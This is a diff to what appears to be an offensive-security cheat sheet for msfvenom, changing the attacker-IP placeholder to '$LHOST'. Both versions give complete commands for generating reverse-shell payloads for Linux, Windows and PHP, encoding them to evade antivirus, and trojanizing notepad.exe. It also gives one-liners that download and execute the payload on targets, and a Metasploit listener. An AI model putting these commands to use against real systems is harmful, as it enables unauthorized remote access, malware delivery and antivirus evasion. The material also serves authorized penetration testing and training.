@@ -22,25 +22,25 @@ msfvenom --list payloads | grep linux
 ### Linux Reverse Shell (ELF)
 
 ```bash
-msfvenom -p linux/x86/shell_reverse_tcp LHOST=<attacker-ip> LPORT=<port> -f elf > shell.elf
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=$LHOST LPORT=<port> -f elf > shell.elf
 ```
 
 ### Windows Reverse Shell (EXE)
 
 ```bash
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker-ip> LPORT=<port> -f exe > shell.exe
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=<port> -f exe > shell.exe
 ```
 
 ### PHP Reverse Shell
 
 ```bash
-msfvenom -p php/meterpreter_reverse_tcp LHOST=<attacker-ip> LPORT=<port> -f raw > shell.php
+msfvenom -p php/meterpreter_reverse_tcp LHOST=$LHOST LPORT=<port> -f raw > shell.php
 ```
 
 ### Windows Shellcode (for injection)
 
 ```bash
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker-ip> LPORT=<port> -f c
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=<port> -f c
 ```
 
 ---
@@ -48,7 +48,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker-ip> LPORT=<port> -f c
 ## Encode to Evade AV
 
 ```bash
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker-ip> LPORT=<port> \
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=<port> \
   -f exe -e x86/shikata_ga_nai -i 5 > encoded_shell.exe
 
 msfvenom --list encoders
@@ -60,7 +60,7 @@ msfvenom --list encoders
 
 ```bash
 msfvenom -p windows/x64/meterpreter/reverse_tcp -x notepad.exe -k \
-  -f exe -o infected.exe LHOST=<attacker-ip> LPORT=<port>
+  -f exe -o infected.exe LHOST=$LHOST LPORT=<port>
 ```
 
 ---
@@ -72,10 +72,10 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp -x notepad.exe -k \
 python3 -m http.server 80
 
 # On Linux target
-wget http://<attacker-ip>/shell.elf -O /tmp/shell.elf && chmod +x /tmp/shell.elf && /tmp/shell.elf
+wget http://$LHOST/shell.elf -O /tmp/shell.elf && chmod +x /tmp/shell.elf && /tmp/shell.elf
 
 # On Windows target (PowerShell)
-iwr -uri http://<attacker-ip>/shell.exe -OutFile C:\Temp\shell.exe; C:\Temp\shell.exe
+iwr -uri http://$LHOST/shell.exe -OutFile C:\Temp\shell.exe; C:\Temp\shell.exe
 ```
 
 ---
@@ -83,5 +83,5 @@ iwr -uri http://<attacker-ip>/shell.exe -OutFile C:\Temp\shell.exe; C:\Temp\shel
 ## Set Up the Listener
 
 ```bash
-msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST <attacker-ip>; set LPORT <port>; exploit"
+msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST $LHOST; set LPORT <port>; exploit"
 ```
